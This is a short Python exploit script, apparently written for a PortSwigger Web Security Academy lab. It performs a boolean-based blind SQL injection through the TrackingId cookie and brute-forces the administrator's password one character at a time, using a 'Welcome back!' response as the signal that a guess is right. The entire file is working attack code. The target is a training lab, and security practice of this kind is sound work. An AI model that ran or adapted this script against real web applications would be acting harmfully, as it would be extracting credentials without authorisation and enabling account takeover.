#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#! Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "https://0a7d0015035304b6c0a7400300d5003f.web-security-academy.net"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    
    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1,21):
        for character in characters:

            cookies = {
                    'TrackingId' : "apeHv7fp5heag6VM'and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
                    'session' : "h8rWkjP27FJ7YsNn6MbgKP2b4Y7Y7VTG"
            }

            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break


if __name__ == "__main__":
    makeRequest()
